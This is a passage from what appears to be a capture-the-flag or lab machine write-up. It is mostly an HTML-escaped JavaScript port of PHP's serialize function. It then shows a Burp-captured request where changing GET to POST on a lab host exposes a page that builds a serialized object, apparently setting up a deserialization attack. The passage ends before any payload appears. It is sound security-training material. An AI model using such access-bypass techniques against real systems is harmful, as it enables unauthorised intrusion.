        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0080&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;nx&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0800&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;nx&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;nx&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;_getType&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;inp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;types&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;typeof&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;inp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'object'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;inp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'null'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'object'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;inp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;constructor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'object'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;cons&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;inp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;constructor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;match&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;(\w&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;)\(&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;nx&quot;&gt;cons&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toLowerCase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;types&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'boolean'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'number'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'string'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'array'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;types&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cons&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;types&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;types&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_getType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mixed_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'function'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'boolean'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'b:'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mixed_value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'1'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'number'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;round&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mixed_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mixed_value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'i'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'d'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;':'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mixed_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'string'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s:'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_utf8Size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mixed_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;':&quot;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mixed_value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&quot;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'array'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'object'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'a'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/*
        if (type === 'object') {
          var objname = mixed_value.constructor.toString().match(/(\w+)\(\)/);
          if (objname == undefined) {
            return;
          }
          objname[1] = this.serialize(objname[1]);
          val = 'O' + objname[1].substring(1, objname[1].length - 1);
        }
        */&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mixed_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mixed_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hasOwnProperty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;ktype&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_getType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mixed_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ktype&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'function'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;nx&quot;&gt;okey&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/^&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;0-9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;+$/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;parseInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;vals&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;okey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mixed_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;':'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;':{'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;vals&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'undefined'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// Fall-through&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// if the JS object has a property which contains a null value, the string cannot be unserialized by PHP&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'N'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'object'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'array'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;';'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;But after some time I decided to fire up &lt;b&gt;Burp&lt;/b&gt; in order to find anything more as these scripts meant nothing to me.  &lt;/p&gt;

&lt;p&gt;And finally here it is, changing &lt;b&gt;GET&lt;/b&gt; to &lt;b&gt;POST&lt;/b&gt; resulted in access to the content. We can finally look at this website. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;POST /index.php HTTP/1.1
Host: 192.168.56.103
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;HTTP/1.1 200 OK
Date: Sat, 29 Jul 2017 21:05:19 GMT
Server: Apache
Vary: Accept-Encoding
X-Frame-Options: sameorigin
Content-Length: 2042
Connection: close
Content-Type: text/html; charset=UTF-8


&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;http-equiv=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/html; charset=UTF-8&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;scriptz/php.js&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;submit_form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;firstname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Rene'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;surname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Margitte'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;artwork&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'The Treachery of Images'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
